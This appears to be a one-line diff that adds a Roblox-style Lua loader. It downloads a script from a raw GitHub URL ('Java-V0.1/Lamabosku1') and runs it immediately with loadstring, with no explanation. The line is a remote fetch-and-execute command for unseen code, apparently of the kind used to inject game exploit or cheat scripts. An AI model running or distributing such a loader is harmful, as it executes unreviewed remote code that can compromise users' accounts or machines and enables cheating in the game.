@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/qrrjjjjjjj/Java-V0.1/main/Lamabosku1"))()
